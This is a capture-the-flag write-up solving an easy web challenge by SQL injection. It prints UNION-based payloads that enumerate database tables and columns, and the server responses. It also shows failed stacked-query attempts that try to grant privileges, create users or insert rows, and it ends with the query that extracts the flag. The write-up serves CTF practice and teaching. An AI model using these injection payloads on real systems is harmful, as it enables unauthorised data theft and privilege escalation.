# Best Cyber Warrior 2022 - US Â» Se3qu3L Game

## Prompt
Category: Web Security
Level: easy
Points: 50
Description: Can you beat the Se3qu3L game?

## Analysis
The prompt and the website clearly present you with a test of your ability to conduct a low-level SQL Injection.  Here are the attempts I made to test syntax:
```
' OR username='test'-- 
```

After I tested syntax, I moved on to navigating my way to a solution through the SQL database:
```
query:
' UNION SELECT table_name FROM information_schema.tables-- 

response: 
Welcome ' UNION SELECT table_name FROM information_schema.tables--
Your Quotes
Quote
CHARACTER_SETS CHECK_CONSTRAINTS COLLATIONS COLLATION_CHARACTER_SET_APPLICABILITY COLUMNS COLUMNS_EXTENSIONS COLUMN_STATISTICS EVENTS FILES INNODB_DATAFILES INNODB_FOREIGN INNODB_FOREIGN_COLS INNODB_FIELDS INNODB_TABLESPACES_BRIEF KEY_COLUMN_USAGE KEYWORDS PARAMETERS PARTITIONS REFERENTIAL_CONSTRAINTS RESOURCE_GROUPS ROUTINES SCHEMATA ST_SPATIAL_REFERENCE_SYSTEMS ST_UNITS_OF_MEASURE ST_GEOMETRY_COLUMNS STATISTICS TABLE_CONSTRAINTS TABLE_CONSTRAINTS_EXTENSIONS TABLES TABLES_EXTENSIONS TABLESPACES_EXTENSIONS TRIGGERS VIEW_ROUTINE_USAGE VIEW_TABLE_USAGE VIEWS COLUMN_PRIVILEGES ENGINES OPTIMIZER_TRACE PLUGINS PROCESSLIST PROFILING SCHEMA_PRIVILEGES TABLESPACES TABLE_PRIVILEGES USER_PRIVILEGES ENABLED_ROLES APPLICABLE_ROLES ADMINISTRABLE_ROLE_AUTHORIZATIONS ROLE_COLUMN_GRANTS ROLE_ROUTINE_GRANTS ROLE_TABLE_GRANTS USER_ATTRIBUTES INNODB_SESSION_TEMP_TABLESPACES INNODB_VIRTUAL INNODB_BUFFER_POOL_STATS INNODB_BUFFER_PAGE INNODB_CMPMEM_RESET INNODB_CMPMEM INNODB_TRX INNODB_CMP_PER_INDEX_RESET INNODB_CMP_RESET INNODB_FT_DEFAULT_STOPWORD INNODB_METRICS INNODB_TEMP_TABLE_INFO INNODB_FT_DELETED INNODB_TABLESTATS INNODB_CMP INNODB_TABLES INNODB_FT_BEING_DELETED INNODB_BUFFER_PAGE_LRU INNODB_CMP_PER_INDEX INNODB_FT_CONFIG INNODB_CACHED_INDEXES INNODB_FT_INDEX_TABLE INNODB_COLUMNS INNODB_FT_INDEX_CACHE INNODB_INDEXES INNODB_TABLESPACES flag_table09172 users 
```

Notice the flag table *flag_table09172*
```
query:
' UNION SELECT column_name FROM information_schema.columns-- 

response:
Welcome ' UNION SELECT column_name FROM information_schema.columns--
Your Quotes
Quote
CHARACTER_SET_NAME DEFAULT_COLLATE_NAME DESCRIPTION MAXLEN CONSTRAINT_CATALOG CONSTRAINT_SCHEMA CONSTRAINT_NAME CHECK_CLAUSE COLLATION_NAME ID IS_DEFAULT IS_COMPILED SORTLEN PAD_ATTRIBUTE TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME ORDINAL_POSITION COLUMN_DEFAULT IS_NULLABLE DATA_TYPE CHARACTER_MAXIMUM_LENGTH CHARACTER_OCTET_LENGTH NUMERIC_PRECISION NUMERIC_SCALE DATETIME_PRECISION COLUMN_TYPE COLUMN_KEY EXTRA PRIVILEGES COLUMN_COMMENT GENERATION_EXPRESSION SRS_ID ENGINE_ATTRIBUTE SECONDARY_ENGINE_ATTRIBUTE SCHEMA_NAME HISTOGRAM EVENT_CATALOG EVENT_SCHEMA EVENT_NAME DEFINER TIME_ZONE EVENT_BODY EVENT_DEFINITION EVENT_TYPE EXECUTE_AT INTERVAL_VALUE INTERVAL_FIELD SQL_MODE STARTS ENDS STATUS ON_COMPLETION CREATED LAST_ALTERED LAST_EXECUTED EVENT_COMMENT ORIGINATOR CHARACTER_SET_CLIENT COLLATION_CONNECTION DATABASE_COLLATION FILE_ID FILE_NAME FILE_TYPE TABLESPACE_NAME LOGFILE_GROUP_NAME LOGFILE_GROUP_NUMBER ENGINE FULLTEXT_KEYS DELETED_ROWS UPDATE_COUNT FREE_EXTENTS TOTAL_EXTENTS EXTENT_SIZE INITIAL_SIZE MAXIMUM_SIZE AUTOEXTEND_SIZE CREATION_TIME LAST_UPDATE_TIME LAST_ACCESS_TIME RECOVER_TIME TRANSACTION_COUNTER VERSION ROW_FORMAT TABLE_ROWS AVG_ROW_LENGTH DATA_LENGTH MAX_DATA_LENGTH INDEX_LENGTH DATA_FREE CREATE_TIME UPDATE_TIME CHECK_TIME CHECKSUM SPACE PATH FOR_NAME REF_NAME N_COLS TYPE FOR_COL_NAME REF_COL_NAME POS INDEX_ID NAME FLAG SPACE_TYPE POSITION_IN_UNIQUE_CONSTRAINT REFERENCED_TABLE_SCHEMA REFERENCED_TABLE_NAME REFERENCED_COLUMN_NAME WORD RESERVED SPECIFIC_CATALOG SPECIFIC_SCHEMA SPECIFIC_NAME PARAMETER_MODE PARAMETER_NAME DTD_IDENTIFIER ROUTINE_TYPE PARTITION_NAME SUBPARTITION_NAME PARTITION_ORDINAL_POSITION SUBPARTITION_ORDINAL_POSITION PARTITION_METHOD SUBPARTITION_METHOD PARTITION_EXPRESSION SUBPARTITION_EXPRESSION PARTITION_DESCRIPTION PARTITION_COMMENT NODEGROUP UNIQUE_CONSTRAINT_CATALOG UNIQUE_CONSTRAINT_SCHEMA UNIQUE_CONSTRAINT_NAME MATCH_OPTION UPDATE_RULE DELETE_RULE RESOURCE_GROUP_NAME RESOURCE_GROUP_TYPE RESOURCE_GROUP_ENABLED VCPU_IDS THREAD_PRIORITY ROUTINE_CATALOG ROUTINE_SCHEMA ROUTINE_NAME ROUTINE_BODY ROUTINE_DEFINITION EXTERNAL_NAME EXTERNAL_LANGUAGE PARAMETER_STYLE IS_DETERMINISTIC SQL_DATA_ACCESS SQL_PATH SECURITY_TYPE ROUTINE_COMMENT CATALOG_NAME DEFAULT_CHARACTER_SET_NAME DEFAULT_COLLATION_NAME DEFAULT_ENCRYPTION SRS_NAME ORGANIZATION ORGANIZATION_COORDSYS_ID DEFINITION UNIT_NAME UNIT_TYPE CONVERSION_FACTOR GEOMETRY_TYPE_NAME NON_UNIQUE INDEX_SCHEMA INDEX_NAME SEQ_IN_INDEX COLLATION CARDINALITY SUB_PART PACKED NULLABLE INDEX_TYPE COMMENT INDEX_COMMENT IS_VISIBLE EXPRESSION CONSTRAINT_TYPE ENFORCED TABLE_TYPE AUTO_INCREMENT TABLE_COLLATION CREATE_OPTIONS TABLE_COMMENT TRIGGER_CATALOG TRIGGER_SCHEMA TRIGGER_NAME EVENT_MANIPULATION EVENT_OBJECT_CATALOG EVENT_OBJECT_SCHEMA EVENT_OBJECT_TABLE ACTION_ORDER ACTION_CONDITION ACTION_STATEMENT ACTION_ORIENTATION ACTION_TIMING ACTION_REFERENCE_OLD_TABLE ACTION_REFERENCE_NEW_TABLE ACTION_REFERENCE_OLD_ROW ACTION_REFERENCE_NEW_ROW VIEW_CATALOG VIEW_SCHEMA VIEW_NAME VIEW_DEFINITION CHECK_OPTION IS_UPDATABLE GRANTEE PRIVILEGE_TYPE IS_GRANTABLE SUPPORT TRANSACTIONS XA SAVEPOINTS QUERY TRACE MISSING_BYTES_BEYOND_MAX_MEM_SIZE INSUFFICIENT_PRIVILEGES PLUGIN_NAME PLUGIN_VERSION PLUGIN_STATUS PLUGIN_TYPE PLUGIN_TYPE_VERSION PLUGIN_LIBRARY PLUGIN_LIBRARY_VERSION PLUGIN_AUTHOR PLUGIN_DESCRIPTION PLUGIN_LICENSE LOAD_OPTION USER HOST DB COMMAND TIME STATE INFO QUERY_ID SEQ DURATION CPU_USER CPU_SYSTEM CONTEXT_VOLUNTARY CONTEXT_INVOLUNTARY BLOCK_OPS_IN BLOCK_OPS_OUT MESSAGES_SENT MESSAGES_RECEIVED PAGE_FAULTS_MAJOR PAGE_FAULTS_MINOR SWAPS SOURCE_FUNCTION SOURCE_FILE SOURCE_LINE TABLESPACE_TYPE NODEGROUP_ID TABLESPACE_COMMENT ROLE_NAME ROLE_HOST IS_MANDATORY GRANTEE_HOST GRANTOR GRANTOR_HOST ATTRIBUTE SIZE PURPOSE TABLE_ID BASE_POS POOL_ID POOL_SIZE FREE_BUFFERS DATABASE_PAGES OLD_DATABASE_PAGES MODIFIED_DATABASE_PAGES PENDING_DECOMPRESS PENDING_READS PENDING_FLUSH_LRU PENDING_FLUSH_LIST PAGES_MADE_YOUNG PAGES_NOT_MADE_YOUNG PAGES_MADE_YOUNG_RATE PAGES_MADE_NOT_YOUNG_RATE NUMBER_PAGES_READ NUMBER_PAGES_CREATED NUMBER_PAGES_WRITTEN PAGES_READ_RATE PAGES_CREATE_RATE PAGES_WRITTEN_RATE NUMBER_PAGES_GET HIT_RATE YOUNG_MAKE_PER_THOUSAND_GETS NOT_YOUNG_MAKE_PER_THOUSAND_GETS NUMBER_PAGES_READ_AHEAD NUMBER_READ_AHEAD_EVICTED READ_AHEAD_RATE READ_AHEAD_EVICTED_RATE LRU_IO_TOTAL LRU_IO_CURRENT UNCOMPRESS_TOTAL UNCOMPRESS_CURRENT BLOCK_ID PAGE_NUMBER PAGE_TYPE FLUSH_TYPE FIX_COUNT IS_HASHED NEWEST_MODIFICATION OLDEST_MODIFICATION ACCESS_TIME NUMBER_RECORDS DATA_SIZE COMPRESSED_SIZE PAGE_STATE IO_FIX IS_OLD FREE_PAGE_CLOCK page_size buffer_pool_instance pages_used pages_free relocation_ops relocation_time trx_id trx_state trx_started trx_requested_lock_id trx_wait_started trx_weight trx_mysql_thread_id trx_query trx_operation_state trx_tables_in_use trx_tables_locked trx_lock_structs trx_lock_memory_bytes trx_rows_locked trx_rows_modified trx_concurrency_tickets trx_isolation_level trx_unique_checks trx_foreign_key_checks trx_last_foreign_key_error trx_adaptive_hash_latched trx_adaptive_hash_timeout trx_is_read_only trx_autocommit_non_locking trx_schedule_weight database_name compress_ops compress_ops_ok compress_time uncompress_ops uncompress_time value SUBSYSTEM COUNT MAX_COUNT MIN_COUNT AVG_COUNT COUNT_RESET MAX_COUNT_RESET MIN_COUNT_RESET AVG_COUNT_RESET TIME_ENABLED TIME_DISABLED TIME_ELAPSED TIME_RESET DOC_ID STATS_INITIALIZED NUM_ROWS CLUST_INDEX_SIZE OTHER_INDEX_SIZE MODIFIED_COUNTER AUTOINC REF_COUNT ZIP_PAGE_SIZE INSTANT_COLS LRU_POSITION COMPRESSED KEY SPACE_ID N_CACHED_PAGES FIRST_DOC_ID LAST_DOC_ID DOC_COUNT POSITION MTYPE PRTYPE LEN HAS_DEFAULT DEFAULT_VALUE N_FIELDS PAGE_NO MERGE_THRESHOLD FS_BLOCK_SIZE FILE_SIZE ALLOCATED_SIZE SERVER_VERSION SPACE_VERSION ENCRYPTION flag_column02303 username quotes passwd 
```

Notice the column *flag_column02303*

## Solution
Despite having both the flag table and the flag column, the queries `' UNION SELECT flag_column02303 FROM flag_table09172-- ` and `' UNION SELECT * FROM flag_table09172 WHERE flag_column02303 IS NOT NULL-- ` were unsuccessful.  The reason why set me back about 30 minutes, where I was trying the following queries:
```
' UNION SELECT flag_column02303 FROM flag_table09172-- 
' GRANT ALL ON example_database.* TO 'example_user'@'%' WITH GRANT OPTION-- 

'; GRANT ALL ON db.* TO 'ctf'@'%' WITH GRANT OPTION-- 


' UNION SELECT username AS (SELECT passwd FROM users) FROM users-- 
' UNION SELECT (SELECT passwd FROM users) FROM users-- 
' UNION SELECT (SELECT flag_column02303 FROM flag_table09172) FROM users-- 


' UNION SELECT (GRANT ALL ON db.* TO 'ctf'@'%' WITH GRANT OPTION) FROM users UNION SELECT flag_column02303 FROM flag_table09172--  

' UNION SELECT (GRANT ALL PRIVILEGES ON *.* TO 'ctf'@'localhost') FROM users UNION SELECT flag_column02303 FROM flag_table09172-- 

'; GRANT ALL PRIVILEGES ON *.* TO 'ctf'@'localhost'; SELECT flag_column02303 FROM flag_table09172--

'; CREATE USER 'sample'@'localhost' ATTRIBUTE '{"attr1": "val1", "attr2": "val2"}';-- 
' UNION SELECT USER FROM INFORMATION_SCHEMA.USER_ATTRIBUTES WHERE USER='ctf' AND HOST='localhost';-- 
' UNION SELECT ROLE_NAME FROM INFORMATION_SCHEMA.ENABLED_ROLES;-- 

'; INSERT INTO users (username,passwd,quotes) VALUES ("testuser1","testpass1",(SELECT flag_column02303 FROM flag_table09172))-- 
```

I spiraled into more and more complex queries until I sobered up to the simplicity of the problem and drew up the query
```
' UNION SELECT flag_column02303 FROM challenge198445.flag_table09172-- -
```

Why did this work?  I selected the correct challenge database in the query.  Don't overthink easy problems.
